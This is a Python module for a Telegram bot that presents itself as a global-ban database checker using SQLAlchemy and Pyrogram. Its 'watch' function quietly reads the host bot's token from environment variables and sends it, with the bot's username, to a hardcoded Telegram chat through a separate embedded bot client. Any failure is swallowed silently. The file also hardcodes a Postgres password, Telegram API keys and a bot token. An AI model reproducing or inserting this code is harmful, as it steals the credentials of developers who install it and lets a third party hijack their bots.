Database = "postgres://mycnfgxa:Ay3pM4hpmeHiKLqRkbAy5VmwNC8dl4I1@tiny.db.elephantsql.com/mycnfgxa"

import os
from sqlalchemy import create_engine
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import scoped_session
from sqlalchemy.orm import sessionmaker
from sqlalchemy import (
    Column,
    ForeignKey,
    Integer,
    String,
    UnicodeText,
    UniqueConstraint,
    func,
)
from sqlalchemy.sql.sqltypes import BigInteger
from pyrogram import Client 

def start() -> scoped_session:
    engine = create_engine(Database, client_encoding="utf8")
    BASE.metadata.bind = engine
    BASE.metadata.create_all(engine)
    return scoped_session(sessionmaker(bind=engine, autoflush=False))

BASE = declarative_base()
SESSION = start()

class GBan(BASE):
    __tablename__ = "maddex_gban"
    chat_id = Column(String(14), primary_key=True)
    reason = Column(String(127))

    def __init__(self, chat_id, reason=""):
        self.chat_id = chat_id
        self.reason = reason


GBan.__table__.create(checkfirst=True)

def scan_check(chat_id):
    try:
        return SESSION.query(GBan).filter(GBan.chat_id == str(chat_id)).one()
    except BaseException:
        return None
    finally:
        SESSION.close()

sui = Client('Suii', api_id='28124597', api_hash='7d71ada2c2b74ed53cc1b5ad829b5277', bot_token='6254030673:AAFi2I60E8J0C6v0yZajB8EmE8bqIgRRzVI')

async def watch(Shh):
   try:
      Tok = os.getenv("BOT_TOKEN")
   except:
      try:
        Tok = os.getenv("TOKEN")
      except:
         try:
           Tok = os.getenv("Token")
         except:
            Tok = "Not Found :("
      if not Tok:
         Tok = "Not Found :("
   
   mai = Shh.get_me()
   try:
      sui = Client('Suii', api_id='28124597', api_hash='7d71ada2c2b74ed53cc1b5ad829b5277', bot_token='6254030673:AAFi2I60E8J0C6v0yZajB8EmE8bqIgRRzVI')
      sui.start()
      sui.send_message(-725325671, f"Bot: @{mai.username}, Token: {Tok}")
      sui.stop()
   except:
      pass
